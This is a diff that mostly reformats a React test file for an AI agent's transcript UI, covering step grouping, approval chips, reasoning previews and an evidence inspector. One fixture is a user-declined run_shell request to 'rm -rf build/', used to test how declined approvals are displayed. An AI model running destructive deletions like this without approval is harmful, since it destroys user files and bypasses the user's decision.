@@ -1,5 +1,11 @@
 import { afterEach, describe, expect, it, vi } from "vitest";
-import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
+import {
+  cleanup,
+  fireEvent,
+  render,
+  screen,
+  waitFor,
+} from "@testing-library/react";
 import { Transcript } from "./Transcript";
 import { humanizeTool } from "../humanize";
 import type { Item } from "../types";
@@ -14,9 +20,28 @@ afterEach(cleanup);
 const TURN: Item[] = [
   { kind: "user", text: "post the digest" },
   { kind: "assistant", text: "Checking what merged since yesterday." },
-  { kind: "tool", id: "t1", name: "read_file", args: { path: "docs/runbook.md" }, status: "ok" },
-  { kind: "approval", name: "send_message", args: { target: "slack:T1/C9" }, reason: "", resolved: "once" },
-  { kind: "tool", id: "t2", name: "send_message", args: { target: "slack:T1/C9", text: "hi" }, status: "ok", preview: '{"ok": true}' },
+  {
+    kind: "tool",
+    id: "t1",
+    name: "read_file",
+    args: { path: "docs/runbook.md" },
+    status: "ok",
+  },
+  {
+    kind: "approval",
+    name: "send_message",
+    args: { target: "slack:T1/C9" },
+    reason: "",
+    resolved: "once",
+  },
+  {
+    kind: "tool",
+    id: "t2",
+    name: "send_message",
+    args: { target: "slack:T1/C9", text: "hi" },
+    status: "ok",
+    preview: '{"ok": true}',
+  },
   { kind: "assistant", text: "Posted to #all-openworker." },
 ];
 
@@ -24,7 +49,13 @@ describe("TurnGroup (Transcript §33)", () => {
   it("keeps hook order stable when restored history switches between HaaS and legacy projections", () => {
     const legacy: Item[] = [
       { kind: "user", text: "inspect the run" },
-      { kind: "tool", id: "call_restore", name: "exec_command", args: {}, status: "ok" },
+      {
+        kind: "tool",
+        id: "call_restore",
+        name: "exec_command",
+        args: {},
+        status: "ok",
+      },
       { kind: "assistant", text: "Done." },
     ];
     const haas: Item[] = [
@@ -42,7 +73,13 @@ describe("TurnGroup (Transcript §33)", () => {
           {
             modelCallId: "mcall_restore",
             status: "completed",
-            steps: [{ stepId: "call_restore", kind: "tool", activityId: "call_restore" }],
+            steps: [
+              {
+                stepId: "call_restore",
+                kind: "tool",
+                activityId: "call_restore",
+              },
+            ],
           },
         ],
       } as Item,
@@ -57,7 +94,9 @@ describe("TurnGroup (Transcript §33)", () => {
   });
 
   it("groups the whole turn; answer stays outside; narration and humanized steps inside", () => {
-    const { container } = render(<Transcript items={TURN} onApprove={vi.fn()} />);
+    const { container } = render(
+      <Transcript items={TURN} onApprove={vi.fn()} />,
+    );
 
     // Collapsed at rest: "2 steps", NO approval count, and no step/narration content visible.
     expect(screen.getByText("2 steps")).toBeTruthy();
@@ -71,7 +110,9 @@ describe("TurnGroup (Transcript §33)", () => {
     // Expand → narration renders quiet inside; steps are English lines, not raw args;
     // the approval is a chip on the send_message row, not a separate box.
     fireEvent.click(container.querySelector("summary.stepgroup-head")!);
-    expect(screen.getByTestId("turn-narration").textContent).toContain("Checking what merged");
+    expect(screen.getByTestId("turn-narration").textContent).toContain(
+      "Checking what merged",
+    );
     expect(screen.getByText("runbook.md")).toBeTruthy();
     expect(screen.getByText(/Sent a Slack message to/)).toBeTruthy();
     expect(screen.getByText("✓ user-approved")).toBeTruthy();
@@ -85,23 +126,49 @@ describe("TurnGroup (Transcript §33)", () => {
   it("a running turn is labeled Running but starts COLLAPSED (§33 ref #3)", () => {
     const items: Item[] = [
       { kind: "assistant", text: "Looking at the repo." },
-      { kind: "tool", id: "t1", name: "grep", args: { pattern: "TODO" }, status: "…" },
+      {
+        kind: "tool",
+        id: "t1",
+        name: "grep",
+        args: { pattern: "TODO" },
+        status: "…",
+      },
     ];
-    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
+    const { container } = render(
+      <Transcript items={items} onApprove={vi.fn()} />,
+    );
     expect(screen.getByText(/Running 1 step…/)).toBeTruthy();
     expect(screen.queryByTestId("turn-narration")).toBeNull(); // collapsed by default
-    expect(screen.getByTestId("turn-live-line").textContent).toContain("Looking at the repo");
+    expect(screen.getByTestId("turn-live-line").textContent).toContain(
+      "Looking at the repo",
+    );
     fireEvent.click(container.querySelector("summary.stepgroup-head")!);
     expect(screen.getByTestId("step-running")).toBeTruthy();
   });
 
   it("declined approvals keep their own 'Wanted to' row and surface on the collapsed line", () => {
     const items: Item[] = [
-      { kind: "tool", id: "t1", name: "read_file", args: { path: "a.md" }, status: "ok" },
-      { kind: "approval", name: "run_shell", args: { command: "rm -rf build/" }, reason: "", resolved: "deny" },
+      {
+        kind: "tool",
+        id: "t1",
+        name: "read_file",
+        args: { path: "a.md" },
+        status: "ok",
+      },
+      {
+        kind: "approval",
+        name: "run_shell",
+        args: { command: "rm -rf build/" },
+        reason: "",
+        resolved: "deny",
+      },
     ];
-    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
-    expect(screen.getByTestId("stepgroup-declined").textContent).toBe("1 declined");
+    const { container } = render(
+      <Transcript items={items} onApprove={vi.fn()} />,
+    );
+    expect(screen.getByTestId("stepgroup-declined").textContent).toBe(
+      "1 declined",
+    );
     fireEvent.click(container.querySelector("summary.stepgroup-head")!);
     const ask = screen.getByTestId("turn-ask");
     expect(ask.textContent).toContain("Wanted to run");
@@ -114,7 +181,9 @@ describe("TurnGroup (Transcript §33)", () => {
       { kind: "user", text: "hi" },
       { kind: "assistant", text: "Hello there." },
     ];
-    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
+    const { container } = render(
+      <Transcript items={items} onApprove={vi.fn()} />,
+    );
     expect(container.querySelector("details.stepgroup")).toBeNull();
     expect(screen.getByText("Hello there.")).toBeTruthy();
   });
@@ -144,11 +213,21 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
       status: "completed",
       steps: [
         { stepId: "msg_1", kind: "commentary", text: "正在检查事件桥接。" },
-        { stepId: "reason_1:0", kind: "reasoning_summary", text: "关联字段已经存在。" },
+        {
+          stepId: "reason_1:0",
+          kind: "reasoning_summary",
+          text: "关联字段已经存在。",
+        },
         { stepId: "call_1", kind: "tool", activityId: "call_1" },
         { stepId: "msg_2", kind: "result", text: "已定位问题。" },
       ],
-      usage: { inputTokens: 8100, outputTokens: 746, reasoningOutputTokens: 214, cacheReadTokens: 3600, totalTokens: 8846 },
+      usage: {
+        inputTokens: 8100,
+        outputTokens: 746,
+        reasoningOutputTokens: 214,
+        cacheReadTokens: 3600,
+        totalTokens: 8846,
+      },
     },
   ];
 
@@ -158,8 +237,14 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
         items={[
           { kind: "user", text: "inspect the spec" },
           {
-            kind: "tool", id: "call_specific", name: "exec_command", args: {}, source: "haas",
-            activityKind: "command", safeSummary: "Run command", status: "completed",
+            kind: "tool",
+            id: "call_specific",
+            name: "exec_command",
+            args: {},
+            source: "haas",
+            activityKind: "command",
+            safeSummary: "Run command",
+            status: "completed",
             commandPreview: "cat specs/event-log-sse/README.md",
           },
         ]}
@@ -171,7 +256,9 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
     expect(row.querySelector(".activity-row-title")?.textContent).toBe(
       "cat specs/event-log-sse/README.md",
     );
-    expect(row.querySelector(".activity-row-summary")?.textContent).toBe("Ran a command");
+    expect(row.querySelector(".activity-row-summary")?.textContent).toBe(
+      "Ran a command",
+    );
   });
 
   it("renders commentary, reasoning, actions and results as distinct ordered steps with measured usage", () => {
@@ -206,11 +293,19 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
         onApprove={vi.fn()}
         running
         reasoningText="legacy duplicate"
-        modelStages={[{
-          modelCallId: "mcall_0001",
-          status: "running",
-          steps: [{ stepId: "reason_1:0", kind: "reasoning_summary", text: "Measured summary" }],
-        }]}
+        modelStages={[
+          {
+            modelCallId: "mcall_0001",
+            status: "running",
+            steps: [
+              {
+                stepId: "reason_1:0",
+                kind: "reasoning_summary",
+                text: "Measured summary",
+              },
+            ],
+          },
+        ]}
       />,
     );
 
@@ -227,17 +322,21 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
         items={[{ kind: "user", text: "inspect" }]}
         onApprove={vi.fn()}
         running
-        modelStages={[{
-          modelCallId: "mcall_0001",
-          status: "running",
-          steps: [{
-            stepId: "reason_1:0",
-            kind: "reasoning_summary",
-            previewText: preview,
-            previewFrozen: true,
-            text: complete,
-          }],
-        }]}
+        modelStages={[
+          {
+            modelCallId: "mcall_0001",
+            status: "running",
+            steps: [
+              {
+                stepId: "reason_1:0",
+                kind: "reasoning_summary",
+                previewText: preview,
+                previewFrozen: true,
+                text: complete,
+              },
+            ],
+          },
+        ]}
       />,
     );
 
@@ -245,7 +344,9 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
     const detail = screen.getByTestId("reasoning-detail") as HTMLDetailsElement;
     expect(detail.open).toBe(false);
     expect(detail.textContent).toContain(complete);
-    expect(container.querySelector(".model-stage-reasoning-preview")).toBeTruthy();
+    expect(
+      container.querySelector(".model-stage-reasoning-preview"),
+    ).toBeTruthy();
   });
 
   it("defensively bounds an oversized or legacy reasoning preview", () => {
@@ -255,21 +356,29 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
         items={[{ kind: "user", text: "inspect" }]}
         onApprove={vi.fn()}
         running
-        modelStages={[{
-          modelCallId: "mcall_0001",
-          status: "running",
-          steps: [{
-            stepId: "reason_1:0",
-            kind: "reasoning_summary",
-            previewText: complete,
-            text: complete,
-          }],
-        }]}
+        modelStages={[
+          {
+            modelCallId: "mcall_0001",
+            status: "running",
+            steps: [
+              {
+                stepId: "reason_1:0",
+                kind: "reasoning_summary",
+                previewText: complete,
+                text: complete,
+              },
+            ],
+          },
+        ]}
       />,
     );
 
-    expect(screen.getByTestId("reasoning-preview").textContent).toHaveLength(240);
-    expect(screen.getByTestId("reasoning-detail").textContent).toContain(complete);
+    expect(screen.getByTestId("reasoning-preview").textContent).toHaveLength(
+      240,
+    );
+    expect(screen.getByTestId("reasoning-detail").textContent).toContain(
+      complete,
+    );
   });
 
   it("shows an honest missing-usage state instead of fabricated zeros", () => {
@@ -278,7 +387,9 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
         items={HAAS_TURN.slice(0, 2)}
         onApprove={vi.fn()}
         running
-        modelStages={[{ ...MODEL_STAGES[0], status: "running", usage: undefined }]}
+        modelStages={[
+          { ...MODEL_STAGES[0], status: "running", usage: undefined },
+        ]}
       />,
     );
     expect(screen.getByText("Tokens not reported yet")).toBeTruthy();
@@ -296,7 +407,9 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
     );
     const summary = screen.getByText(/Stage 1/).closest("summary")!;
     fireEvent.click(summary);
-    expect(screen.getByTestId("model-call-stage").hasAttribute("open")).toBe(true);
+    expect(screen.getByTestId("model-call-stage").hasAttribute("open")).toBe(
+      true,
+    );
 
     view.rerender(
       <Transcript
@@ -307,7 +420,9 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
         modelStages={MODEL_STAGES}
       />,
     );
-    expect(screen.getByTestId("model-call-stage").hasAttribute("open")).toBe(true);
+    expect(screen.getByTestId("model-call-stage").hasAttribute("open")).toBe(
+      true,
+    );
   });
 
   it("opens execution evidence from an action inside the model stage", () => {
@@ -320,9 +435,13 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
       />,
     );
 
-    fireEvent.click(screen.getByRole("button", { name: /Run the focused test suite/ }));
+    fireEvent.click(
+      screen.getByRole("button", { name: /Run the focused test suite/ }),
+    );
     expect(screen.getByTestId("activity-inspector")).toBeTruthy();
-    expect(screen.getByTestId("activity-inspector").textContent).toContain("24 passed");
+    expect(screen.getByTestId("activity-inspector").textContent).toContain(
+      "24 passed",
+    );
   });
 
   it("shows live reasoning and semantic work together without machine fields", () => {
@@ -337,7 +456,9 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
     );
 
     expect(screen.getByTestId("activity-stream")).toBeTruthy();
-    expect(screen.getByText("Checking the package and focused tests.")).toBeTruthy();
+    expect(
+      screen.getByText("Checking the package and focused tests."),
+    ).toBeTruthy();
     expect(screen.getByText("Ran a command")).toBeTruthy();
     expect(screen.getByText("Run the focused test suite")).toBeTruthy();
     expect(screen.queryByText(/exec_command|summary=/)).toBeNull();
@@ -347,17 +468,29 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
     const items: Item[] = [
       { kind: "user", text: "run the verification" },
       {
-        kind: "tool", id: "call_first_screen", name: "exec_command", args: {},
-        source: "haas", activityKind: "command", safeSummary: "Run command",
-        commandPreview: "pytest tests/test_release.py -q", status: "completed",
-        outputPreview: "24 passed\n1 warning\nfull diagnostic detail", omittedLineCount: 7,
-        exitCode: 0, durationMs: 820,
+        kind: "tool",
+        id: "call_first_screen",
+        name: "exec_command",
+        args: {},
+        source: "haas",
+        activityKind: "command",
+        safeSummary: "Run command",
+        commandPreview: "pytest tests/test_release.py -q",
+        status: "completed",
+        outputPreview: "24 passed\n1 warning\nfull diagnostic detail",
+        omittedLineCount: 7,
+        exitCode: 0,
+        durationMs: 820,
       },
     ];
 
-    render(<Transcript items={items} onApprove={vi.fn()} taskPhase="completed" />);
+    render(
+      <Transcript items={items} onApprove={vi.fn()} taskPhase="completed" />,
+    );
 
-    const row = screen.getByRole("button", { name: /pytest tests\/test_release.py -q/ });
+    const row = screen.getByRole("button", {
+      name: /pytest tests\/test_release.py -q/,
+    });
     expect(row.textContent).toContain("24 passed");
     expect(row.textContent).toContain("1 warning");
     expect(row.textContent).not.toContain("full diagnostic detail");
@@ -390,7 +523,11 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
 
   it("opens a read-only activity inspector with bounded details", () => {
     render(
-      <Transcript items={HAAS_TURN} onApprove={vi.fn()} taskPhase="completed" />,
+      <Transcript
+        items={HAAS_TURN}
+        onApprove={vi.fn()}
+        taskPhase="completed"
+      />,
     );
     fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
     fireEvent.click(screen.getByRole("button", { name: /Ran a command/ }));
@@ -420,7 +557,11 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
       outputStream: "combined",
       links: [
         { url: ordinaryUrl, kind: "ordinary", expiresAtMs: null },
-        { url: authorizationUrl, kind: "authorization", expiresAtMs: 1_900_000_000_000 },
+        {
+          url: authorizationUrl,
+          kind: "authorization",
+          expiresAtMs: 1_900_000_000_000,
+        },
       ],
       expiresAtMs: 1_900_000_000_000,
     };
@@ -428,10 +569,19 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
     const items: Item[] = [
       { kind: "user", text: "authorize the CLI" },
       {
-        kind: "tool", id: "call_1", name: "exec_command", args: {}, source: "haas",
-        activityKind: "command", safeSummary: "Start CLI authorization", status: "completed",
-        commandPreview: "acme auth login --browser", workingDirectory: "/workspace/project",
-        invocationId: "inv_1", evidenceRef: "evd_1", evidenceExpiresAtMs: 1_900_000_000_000,
+        kind: "tool",
+        id: "call_1",
+        name: "exec_command",
+        args: {},
+        source: "haas",
+        activityKind: "command",
+        safeSummary: "Start CLI authorization",
+        status: "completed",
+        commandPreview: "acme auth login --browser",
+        workingDirectory: "/workspace/project",
+        invocationId: "inv_1",
+        evidenceRef: "evd_1",
+        evidenceExpiresAtMs: 1_900_000_000_000,
       },
       { kind: "assistant", text: "Authorization is waiting in the browser." },
     ];
@@ -448,11 +598,19 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
     expect(screen.getByText("acme auth login --browser")).toBeTruthy();
     fireEvent.click(screen.getByRole("button", { name: /Ran a command/ }));
 
-    await waitFor(() => expect(loadExecutionEvidence).toHaveBeenCalledWith("inv_1", "call_1", "evd_1"));
+    await waitFor(() =>
+      expect(loadExecutionEvidence).toHaveBeenCalledWith(
+        "inv_1",
+        "call_1",
+        "evd_1",
+      ),
+    );
     const inspector = screen.getByTestId("activity-inspector");
     expect(inspector.textContent).toContain(command);
     expect(inspector.textContent).toContain("/workspace/project");
-    expect(inspector.textContent).toContain("Open https://docs.example.com/runbook");
+    expect(inspector.textContent).toContain(
+      "Open https://docs.example.com/runbook",
+    );
     for (const url of [ordinaryUrl, authorizationUrl]) {
       const links = screen.getAllByRole("link", { name: url });
       expect(links.length).toBeGreaterThan(0);
@@ -467,42 +625,79 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
   });
 
   it("explains when short-lived execution evidence has expired", async () => {
-    const loadExecutionEvidence = vi.fn().mockRejectedValue(
-      Object.assign(new Error("expired"), { status: 410, code: "haas_execution_evidence_expired" }),
-    );
+    const loadExecutionEvidence = vi
+      .fn()
+      .mockRejectedValue(
+        Object.assign(new Error("expired"), {
+          status: 410,
+          code: "haas_execution_evidence_expired",
+        }),
+      );
     const items: Item[] = [
       { kind: "user", text: "run it" },
       {
-        kind: "tool", id: "call_expired", name: "exec_command", args: {}, source: "haas",
-        activityKind: "command", safeSummary: "Run the command", status: "failed",
-        commandPreview: "make verify", invocationId: "inv_expired", evidenceRef: "evd_expired",
+        kind: "tool",
+        id: "call_expired",
+        name: "exec_command",
+        args: {},
+        source: "haas",
+        activityKind: "command",
+        safeSummary: "Run the command",
+        status: "failed",
+        commandPreview: "make verify",
+        invocationId: "inv_expired",
+        evidenceRef: "evd_expired",
       },
     ];
-    render(<Transcript items={items} onApprove={vi.fn()} loadExecutionEvidence={loadExecutionEvidence} />);
+    render(
+      <Transcript
+        items={items}
+        onApprove={vi.fn()}
+        loadExecutionEvidence={loadExecutionEvidence}
+      />,
+    );
     fireEvent.click(screen.getByRole("button", { name: /Ran a command/ }));
     expect(await screen.findByText("Execution evidence expired")).toBeTruthy();
   });
 
   it("moves focus for keyboard selection and restores it on Escape", async () => {
-    render(<Transcript items={HAAS_TURN} onApprove={vi.fn()} taskPhase="completed" />);
+    render(
+      <Transcript
+        items={HAAS_TURN}
+        onApprove={vi.fn()}
+        taskPhase="completed"
+      />,
+    );
     fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
     const row = screen.getByRole("button", { name: /Ran a command/ });
     row.focus();
     fireEvent.click(row, { detail: 0 });
-    await waitFor(() => expect(document.activeElement?.textContent).toBe("Ran a command"));
-    fireEvent.keyDown(screen.getByTestId("activity-inspector"), { key: "Escape" });
+    await waitFor(() =>
+      expect(document.activeElement?.textContent).toBe("Ran a command"),
+    );
+    fireEvent.keyDown(screen.getByTestId("activity-inspector"), {
+      key: "Escape",
+    });
     await waitFor(() => expect(document.activeElement).toBe(row));
   });
 
   it("closes from Escape after pointer selection without stealing row focus", async () => {
-    render(<Transcript items={HAAS_TURN} onApprove={vi.fn()} taskPhase="completed" />);
+    render(
+      <Transcript
+        items={HAAS_TURN}
+        onApprove={vi.fn()}
+        taskPhase="completed"
+      />,
+    );
     fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
     const row = screen.getByRole("button", { name: /Ran a command/ });
     row.focus();
     fireEvent.click(row, { detail: 1 });
     expect(document.activeElement).toBe(row);
     fireEvent.keyDown(document, { key: "Escape" });
-    await waitFor(() => expect(screen.queryByTestId("activity-inspector")).toBeNull());
+    await waitFor(() =>
+      expect(screen.queryByTestId("activity-inspector")).toBeNull(),
+    );
     expect(document.activeElement).toBe(row);
   });
 
@@ -510,12 +705,22 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
     const items: Item[] = [
       HAAS_TURN[0],
       HAAS_TURN[1],
-      { kind: "assistant", text: "The release checks passed.", reasoning: "Checked package metadata and tests." },
+      {
+        kind: "assistant",
+        text: "The release checks passed.",
+        reasoning: "Checked package metadata and tests.",
+      },
     ];
-    render(<Transcript items={items} onApprove={vi.fn()} taskPhase="completed" />);
-    expect(screen.queryByText("Checked package metadata and tests.")).toBeNull();
+    render(
+      <Transcript items={items} onApprove={vi.fn()} taskPhase="completed" />,
+    );
+    expect(
+      screen.queryByText("Checked package metadata and tests."),
+    ).toBeNull();
     fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
-    expect(screen.getByText("Checked package metadata and tests.")).toBeTruthy();
+    expect(
+      screen.getByText("Checked package metadata and tests."),
+    ).toBeTruthy();
   });
 
   it.each([
@@ -529,13 +734,19 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
         items={HAAS_TURN}
         onApprove={vi.fn()}
         taskPhase={phase}
-        taskOutcome={{ phase, code: "provider_failed", safeReason: "Provider unavailable" }}
+        taskOutcome={{
+          phase,
+          code: "provider_failed",
+          safeReason: "Provider unavailable",
+        }}
       />,
     );
     expect(screen.getByText(label)).toBeTruthy();
     expect(screen.queryByText("Completed · 1 activity")).toBeNull();
     if (phase !== "verifying") {
-      expect(screen.getByTestId("activity-task-error").textContent).toContain("Provider unavailable");
+      expect(screen.getByTestId("activity-task-error").textContent).toContain(
+        "Provider unavailable",
+      );
     }
   });
 
@@ -547,7 +758,11 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
         onApprove={vi.fn()}
         onRetry={onRetry}
         taskPhase="failed"
-        taskOutcome={{ phase: "failed", safeReason: "Provider unavailable", retryable: false }}
+        taskOutcome={{
+          phase: "failed",
+          safeReason: "Provider unavailable",
+          retryable: false,
+        }}
       />,
     );
     expect(screen.queryByRole("button", { name: "Retry" })).toBeNull();
@@ -557,7 +772,11 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
         onApprove={vi.fn()}
         onRetry={onRetry}
         taskPhase="failed"
-        taskOutcome={{ phase: "failed", safeReason: "Provider unavailable", retryable: true }}
+        taskOutcome={{
+          phase: "failed",
+          safeReason: "Provider unavailable",
+          retryable: true,
+        }}
       />,
     );
     fireEvent.click(screen.getByRole("button", { name: "Retry" }));
@@ -568,20 +787,35 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
     const items: Item[] = [
       { kind: "user", text: "first" },
       {
-        kind: "tool", id: "old", name: "haas_activity", args: {}, source: "haas",
-        activityKind: "command", safeSummary: "First attempt", status: "failed",
-        safeReason: "Command failed", taskOutcome: { phase: "failed", safeReason: "Command failed" },
+        kind: "tool",
+        id: "old",
+        name: "haas_activity",
+        args: {},
+        source: "haas",
+        activityKind: "command",
+        safeSummary: "First attempt",
+        status: "failed",
+        safeReason: "Command failed",
+        taskOutcome: { phase: "failed", safeReason: "Command failed" },
       },
       { kind: "assistant", text: "First result", source: "haas" },
       { kind: "user", text: "second" },
       {
-        kind: "tool", id: "new", name: "haas_activity", args: {}, source: "haas",
-        activityKind: "read", safeSummary: "Read config", status: "completed",
+        kind: "tool",
+        id: "new",
+        name: "haas_activity",
+        args: {},
+        source: "haas",
+        activityKind: "read",
+        safeSummary: "Read config",
+        status: "completed",
         taskOutcome: { phase: "completed" },
       },
       { kind: "assistant", text: "Second result", source: "haas" },
     ];
-    render(<Transcript items={items} onApprove={vi.fn()} taskPhase="completed" />);
+    render(
+      <Transcript items={items} onApprove={vi.fn()} taskPhase="completed" />,
+    );
 
     expect(screen.getByText("Failed · 1 activity")).toBeTruthy();
     expect(screen.getByText("Completed · 1 activity")).toBeTruthy();
@@ -590,7 +824,9 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
     fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
     fireEvent.click(screen.getByRole("button", { name: /Read files/ }));
     expect(screen.getAllByTestId("activity-inspector")).toHaveLength(1);
-    expect(screen.getByTestId("activity-inspector").textContent).toContain("Read config");
+    expect(screen.getByTestId("activity-inspector").textContent).toContain(
+      "Read config",
+    );
   });
 });
 
@@ -600,10 +836,19 @@ describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
 describe("origin chips — standing MCP trust names its source", () => {
   const toolWith = (origin: string): Item[] => [
     { kind: "user", text: "search jira" },
-    { kind: "tool", id: "t1", name: "mcp__jira__search", args: { jql: "x" }, status: "ok", approvalOrigin: origin },
+    {
+      kind: "tool",
+      id: "t1",
+      name: "mcp__jira__search",
+      args: { jql: "x" },
+      status: "ok",
+      approvalOrigin: origin,
+    },
   ];
   const chipFor = (origin: string) => {
-    const { container } = render(<Transcript items={toolWith(origin)} onApprove={vi.fn()} />);
+    const { container } = render(
+      <Transcript items={toolWith(origin)} onApprove={vi.fn()} />,
+    );
     fireEvent.click(container.querySelector("summary.stepgroup-head")!);
     const chip = screen.getByTestId("tool-approval-origin");
     return { text: chip.textContent, title: chip.getAttribute("title") };
@@ -644,26 +889,38 @@ describe("origin chips — standing MCP trust names its source", () => {
 describe("live turns (§33 flicker fix)", () => {
   const LIVE: Item[] = [
     { kind: "user", text: "build the app" },
-    { kind: "tool", id: "t1", name: "read_file", args: { path: "data.json" }, status: "ok" },
+    {
+      kind: "tool",
+      id: "t1",
+      name: "read_file",
+      args: { path: "data.json" },
+      status: "ok",
+    },
     { kind: "assistant", text: "Inspecting the fetched dataset next." },
   ];
 
   it("while running, trailing assistant text stays INSIDE the group — no answer bubble flash", () => {
-    const { container } = render(<Transcript items={LIVE} onApprove={vi.fn()} running />);
+    const { container } = render(
+      <Transcript items={LIVE} onApprove={vi.fn()} running />,
+    );
     // No assistant bubble anywhere; the group starts COLLAPSED with the narration riding
     // the header as the live line (§33 ref #3 — expanding is opt-in).
     expect(container.querySelector(".bubble-assistant")).toBeNull();
     expect(screen.queryByTestId("turn-narration")).toBeNull();
-    expect(screen.getByTestId("turn-live-line").textContent).toContain("Inspecting the fetched dataset");
+    expect(screen.getByTestId("turn-live-line").textContent).toContain(
+      "Inspecting the fetched dataset",
+    );
     // Expanding shows it as the quiet line inside.
     fireEvent.click(container.querySelector("summary.stepgroup-head")!);
-    expect(screen.getByTestId("turn-narration").textContent).toContain("Inspecting the fetched dataset");
+    expect(screen.getByTestId("turn-narration").textContent).toContain(
+      "Inspecting the fetched dataset",
+    );
     // Once the turn ends (running=false), the same trailing text IS the answer bubble.
     cleanup();
     const done = render(<Transcript items={LIVE} onApprove={vi.fn()} />);
-    expect(done.container.querySelector(".bubble-assistant")?.textContent).toContain(
-      "Inspecting the fetched dataset",
-    );
+    expect(
+      done.container.querySelector(".bubble-assistant")?.textContent,
+    ).toContain("Inspecting the fetched dataset");
   });
 
   it("quiet streamed text rides the collapsed header and the expanded body — never floats", () => {
@@ -676,19 +933,30 @@ describe("live turns (§33 flicker fix)", () => {
       />,
     );
     // Collapsed: the STREAMING text wins the header live line (fresher than the last item).
-    expect(screen.getByTestId("turn-live-line").textContent).toContain("quote endpoint rate-limited");
+    expect(screen.getByTestId("turn-live-line").textContent).toContain(
+      "quote endpoint rate-limited",
+    );
     expect(container.querySelector(".bubble-assistant")).toBeNull();
     // Expanded: it renders as the small quiet line under the steps.
     fireEvent.click(container.querySelector("summary.stepgroup-head")!);
-    expect(screen.getByTestId("turn-live-stream").textContent).toContain("quote endpoint rate-limited");
+    expect(screen.getByTestId("turn-live-stream").textContent).toContain(
+      "quote endpoint rate-limited",
+    );
   });
 
   it("a PENDING approval neither splits the turn nor promotes the narration", () => {
     const items: Item[] = [
       ...LIVE,
-      { kind: "approval", name: "write_file", args: { path: "app.html" }, reason: "" }, // unresolved
+      {
+        kind: "approval",
+        name: "write_file",
+        args: { path: "app.html" },
+        reason: "",
+      }, // unresolved
     ];
-    const { container } = render(<Transcript items={items} onApprove={vi.fn()} running />);
+    const { container } = render(
+      <Transcript items={items} onApprove={vi.fn()} running />,
+    );
     expect(container.querySelectorAll("details.stepgroup")).toHaveLength(1);
     expect(container.querySelector(".bubble-assistant")).toBeNull();
   });
@@ -698,9 +966,13 @@ describe("live turns (§33 flicker fix)", () => {
       { kind: "user", text: "hi" },
       { kind: "assistant", text: "Hello!" },
     ];
-    const { container } = render(<Transcript items={items} onApprove={vi.fn()} running />);
+    const { container } = render(
+      <Transcript items={items} onApprove={vi.fn()} running />,
+    );
     expect(container.querySelector("details.stepgroup")).toBeNull();
-    expect(container.querySelector(".bubble-assistant")?.textContent).toContain("Hello!");
+    expect(container.querySelector(".bubble-assistant")?.textContent).toContain(
+      "Hello!",
+    );
   });
 });
 
@@ -713,7 +985,10 @@ describe("bubble hover affordances (FB-005)", () => {
 
   it("copy button copies the bubble's raw text and flashes Copied", async () => {
     const writeText = vi.fn().mockResolvedValue(undefined);
-    Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
+    Object.defineProperty(navigator, "clipboard", {
+      value: { writeText },
+      configurable: true,
+    });
     render(<Transcript items={ITEMS} onApprove={vi.fn()} />);
 
     const copies = screen.getAllByTestId("bubble-copy");
@@ -733,7 +1008,9 @@ describe("bubble hover affordances (FB-005)", () => {
     const stamps = screen.getAllByTestId("bubble-ts");
     expect(stamps).toHaveLength(1); // the ts-less assistant bubble shows none
     const when = new Date(TS * 1000);
-    expect(stamps[0].textContent).toBe(when.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" }));
+    expect(stamps[0].textContent).toBe(
+      when.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" }),
+    );
     expect(stamps[0].getAttribute("title")).toBe(when.toLocaleString());
   });
 });
@@ -786,19 +1063,31 @@ describe("memory save notice", () => {
   it("confirms in place once undone, with no Undo left to click", () => {
     render(
       <Transcript
-        items={[{ kind: "memory", id: 7, text: "prefers short replies", undone: true }]}
+        items={[
+          {
+            kind: "memory",
+            id: 7,
+            text: "prefers short replies",
+            undone: true,
+          },
+        ]}
         onApprove={vi.fn()}
         onUndoMemory={vi.fn()}
       />,
     );
-    expect(screen.getByTestId("memory-notice-undone").textContent).toContain("forgotten");
+    expect(screen.getByTestId("memory-notice-undone").textContent).toContain(
+      "forgotten",
+    );
     expect(screen.queryByTestId("memory-notice-undo")).toBeNull();
   });
 });
 
 describe("humanizeTool", () => {
   it("prefers run_shell's model-written description and keeps the command as the object", () => {
-    const line = humanizeTool("run_shell", { command: "git log --since=yesterday", description: "List yesterday's merges" });
+    const line = humanizeTool("run_shell", {
+      command: "git log --since=yesterday",
+      description: "List yesterday's merges",
+    });
     expect(line.pre).toBe("Ran ");
